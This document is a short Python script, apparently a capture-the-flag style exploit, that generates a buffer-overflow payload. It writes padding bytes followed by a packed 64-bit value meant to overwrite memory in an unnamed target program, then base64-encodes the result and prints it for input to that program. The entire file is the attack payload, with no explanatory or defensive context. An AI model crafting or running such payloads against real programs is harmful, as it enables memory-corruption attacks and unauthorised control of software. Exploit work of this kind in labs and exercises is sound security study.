
import sys
import struct
import base64

buf = b'yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy'
buf += struct.pack('<Q', 3434386242141284503)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
